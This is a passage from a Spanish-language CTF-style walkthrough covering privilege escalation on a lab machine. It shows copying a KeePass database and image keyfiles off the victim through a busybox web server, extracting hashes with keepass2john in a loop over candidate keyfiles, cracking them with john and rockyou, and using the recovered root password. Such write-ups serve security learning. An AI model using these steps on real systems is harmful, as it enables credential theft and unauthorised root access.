## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
ls /home/user
```

Vemos un fichero `MyPassword.kdbx` y una serie de imagenes. Lo descargamos en nuestra maquina de atacante.

- en la maquina victima

    ```bash
    which busybox
    busybox httpd -f -p 8000
    ```

- en la maquina de atacante descargamos con `wget` todas las imagenes y el fichero `MyPasswords.kdbx`

Intentamos abrir el ficher `MyPasswords.kdbx` con la utilidad **keepassxc**

```bash
keepassxc MyPasswords.kdbx
```

Vemos que nos pregunta por una contraseña pero vemos que hay un fichero clave que seria una de las imagenes.
Podemos tratar de recuperar el hash del fichero con `keepass2john` pero tenemos que tener en cuenta que si hay un fichero
que esta utilizado como seguridad, tenemos que añadir el parametro -k.

```bash
keepass2john MyPasswords.kdbx -k IMG_0545.JPG
```

Como no sabemos exactamente que imagen es la buena, utilizaremos un oneLiner

```bash
for IMG in $(echo "IMG_0545.JPG IMG_0546.JPG IMG_0547.JPG IMG_0548.JPG IMG_0552.JPG IMG_0553.JPG "); do keepass2john -k $IMG MyPasswords.kdbx | sed "s/Mypasswords/$IMG/"; done > hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

Encontramos la contraseña con la imagen 0547. Si abrimos el keepassxc dando la imagen como keyfile y con la contraseña podemos entrar y vemos un directorio
llamado Root Password

ya podemos utilizar el comando `su root` y leer la flag.



